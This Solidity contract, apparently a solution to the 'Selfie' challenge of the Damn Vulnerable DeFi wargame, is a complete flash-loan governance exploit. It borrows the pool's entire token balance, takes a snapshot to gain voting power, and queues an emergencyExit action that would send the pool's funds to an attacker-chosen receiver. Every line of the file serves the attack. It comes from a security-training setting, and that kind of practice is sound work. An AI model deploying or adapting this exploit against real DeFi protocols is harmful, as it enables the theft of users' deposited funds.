pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "hardhat/console.sol";

contract AttackerSelfie is IERC3156FlashBorrower {
    SelfiePool private pool;
    DamnValuableTokenSnapshot private token;
    SimpleGovernance private gov;
    address private receiver;

    constructor (SelfiePool pool_, address receiver_) {
        pool = pool_;
        token = DamnValuableTokenSnapshot(address(pool.token()));
        gov = pool.governance();
        receiver = receiver_;
    }

    function queueAction() external {
        pool.flashLoan(this, address(token), token.balanceOf(address(pool)), "0x");
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        token.snapshot();
        uint aid = gov.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", receiver));
        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}